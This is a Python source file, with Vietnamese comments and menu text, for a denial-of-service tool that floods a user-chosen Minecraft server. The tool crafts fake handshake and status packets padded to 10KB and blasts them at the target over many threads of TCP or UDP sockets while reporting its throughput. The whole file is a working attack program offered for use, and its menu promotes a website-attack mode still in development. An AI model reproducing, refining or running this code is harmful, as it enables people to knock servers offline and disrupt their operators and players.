import os
import socket
import threading
import time
import struct
import random
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

# Cấu hình tấn công
PACKET_PER_CONN = 5000          # Số gói mỗi kết nối
STATS_INTERVAL = 0.5            # Cập nhật thống kê mỗi 0.5 giây
DATA_PER_PACKET = 10240         # Kích thước gói tin (10KB)
SOCKETS_PER_THREAD = 10         # Số socket mỗi luồng
total_sent = 0                  # Tổng số byte đã gửi
lock = threading.Lock()         # Khóa để tránh xung đột
fake_packets = []               # Danh sách các gói tin giả

# Xử lý dừng chương trình bằng Ctrl+C
def signal_handler(sig, frame):
    print("\nĐã dừng tấn công!")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Hàm mã hóa varint
def pack_varint(value):
    if value < 0:
        return b""
    result = bytearray()
    while True:
        temp = value & 0x7F
        value >>= 7
        if value:
            result.append(temp | 0x80)
        else:
            result.append(temp)
            break
    return bytes(result)

# Xây dựng gói tin giả cho Minecraft (ưu tiên 1.21)
def build_fake_packet(ip, port, protocol_version=767):  # 767 là giao thức cho Minecraft 1.21
    ip_bytes = ip.encode('utf-8')
    # Handshake packet (ID 0x00)
    packet = b'\x00'  # Packet ID
    packet += pack_varint(protocol_version)  # Protocol version (varint)
    packet += pack_varint(len(ip_bytes)) + ip_bytes  # Server address (length + string)
    packet += struct.pack('>H', port)  # Server port (unsigned short)
    packet += pack_varint(1)  # Next state (1 = status)
    # Prepend packet length
    handshake = pack_varint(len(packet)) + packet
    # Add status request packet (optional, for realism)
    request = b'\x01\x00'  # Packet ID 0x01 + empty payload
    base_packet = handshake + request
    # Pad with random data to reach DATA_PER_PACKET (10KB)
    random_data = bytes(random.randint(0, 255) for _ in range(DATA_PER_PACKET - len(base_packet)))
    return base_packet + random_data

# Khởi tạo danh sách gói tin giả
def init_fake_packets(ip, port):
    global fake_packets
    # Bao gồm 1.21 (767) và các phiên bản cũ để tăng độ đa dạng
    protocol_versions = [767, 47, 340, 754]  # 1.21, 1.8, 1.12, 1.16
    fake_packets = [build_fake_packet(ip, port, pv) for pv in protocol_versions]

# Luồng gửi dữ liệu (TCP hoặc UDP)
def sender(ip, port, protocol='tcp'):
    global total_sent, fake_packets
    buffer = random.choice(fake_packets) * PACKET_PER_CONN  # Chọn ngẫu nhiên gói tin và gộp
    buffer_size = len(buffer)
    sockets = []
    
    # Tạo nhiều socket
    for _ in range(SOCKETS_PER_THREAD):
        try:
            if protocol == 'tcp':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)  # Non-blocking
                s.connect_ex((ip, port))  # Bắt đầu kết nối không chặn
            else:  # UDP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setblocking(False)
            sockets.append(s)
        except:
            continue

    while True:
        for s in sockets:
            try:
                if protocol == 'tcp':
                    s.sendall(buffer)
                else:  # UDP
                    s.sendto(buffer, (ip, port))
                with lock:
                    total_sent += buffer_size
            except (BlockingIOError, socket.error):
                continue
        time.sleep(0.001)  # Giảm tải CPU nhẹ

# In thống kê
def stats_printer():
    global total_sent
    prev = 0
    while True:
        time.sleep(STATS_INTERVAL)
        with lock:
            now = total_sent
        delta = now - prev
        prev = now
        mbps = (delta * 8) / (1024 * 1024)  # Đổi sang Mbps
        mb = delta / (1024 * 1024)  # Đổi sang MB
        print(f"[+] Đã gửi {mb:.2f} MB tới mục tiêu ({mbps:.2f} Mbps)")

# Tấn công máy chủ Minecraft
def attack_minecraft():
    os.system('cls' if os.name == 'nt' else 'clear')
    ip = input("Nhập IP máy chủ: ").strip()
    port = int(input("Nhập cổng (VD 25565): ").strip())
    thread_count = int(input("Số thread gửi (VD 100): ").strip())
    protocol = input("Chọn giao thức (tcp/udp/both): ").strip().lower()

    print(f"\nĐang gửi dữ liệu đến {ip}:{port} với {thread_count} threads (giao thức: {protocol})...\n")

    init_fake_packets(ip, port)  # Khởi tạo danh sách gói tin
    threading.Thread(target=stats_printer, daemon=True).start()

    # Sử dụng ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            if protocol == 'both':
                executor.submit(sender, ip, port, 'tcp')
                executor.submit(sender, ip, port, 'udp')
            else:
                executor.submit(sender, ip, port, protocol)

    while True:
        time.sleep(1)  # Giữ chương trình chạy

# Giao diện
def startup():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    menu()

def logo():
    print("""
        ███╗   ██╗██████╗ ██████╗  ██████╗ ███████╗
        ████╗  ██║╚════██╗██╔══██╗██╔═══██╗██╔════╝
        ██╔██╗ ██║ █████╔╝██║  ██║██║   ██║███████╗
        ██║╚██╗██║ ╚═══██╗██║  ██║██║   ██║╚════██║
        ██║ ╚████║██████╔╝██████╔╝╚██████╔╝███████║
        ╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
        Công cụ tấn công máy chủ Minecraft tốt nhất
        Tác giả: N3Co4
    """)

def menu():
    while True:
        print("[", "="*60, "]")
        print("         [1] - Tấn công máy chủ Minecraft")
        print("         [2] - Tấn công máy chủ website (Đang phát triển)")
        print("         [3] - Giới thiệu")
        print("         [4] - Thoát")
        print("[", "="*60, "]")
        choice = input("\nLựa chọn của bạn: ").strip()

        if choice == '1':
            attack_minecraft()
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("\n                 Chức năng này chưa được hoàn thiện.\n")
            print("[", "="*70, "]")
            print("\nNhấn phím bất kỳ để quay lại menu chính...")
            input()
            startup()
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("\n         [1] - Tác giả: N3Co4")
            print("         [2] - Github: https://github.com/N3Co4/N3Dos")
            print("         [3] - Discord: @N3Co4")
            print("         [4] - Mua VPS giá rẻ tại: https://vps247.cloud/")
            print("         [5] - Liên hệ: maillite8@gmail.com\n")
            print("[", "="*70, "]")
            print("\nNhấn phím bất kỳ để quay lại menu chính...")
            input()
            startup()
        elif choice == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Cảm ơn đã sử dụng chương trình của tôi!")
            exit()
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Lựa chọn không hợp lệ, vui lòng thử lại.\n")
            startup()

if __name__ == '__main__':
    startup()